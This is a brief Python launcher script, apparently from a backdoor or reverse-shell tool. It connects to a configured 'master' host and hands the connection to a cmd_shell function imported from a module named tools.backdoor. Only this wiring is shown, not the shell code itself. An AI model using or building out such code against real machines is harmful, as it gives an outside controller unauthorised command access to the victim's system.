from utils.connection import connect_master
from utils.args import get_args
from tools.backdoor import cmd_shell
from utils.configs import *


if __name__ == "__main__":
    global KEY, master_hostname, master_port
    setup()
    conn = connect_master(master_hostname, master_port)
    cmd_shell(conn, master_hostname, master_port)
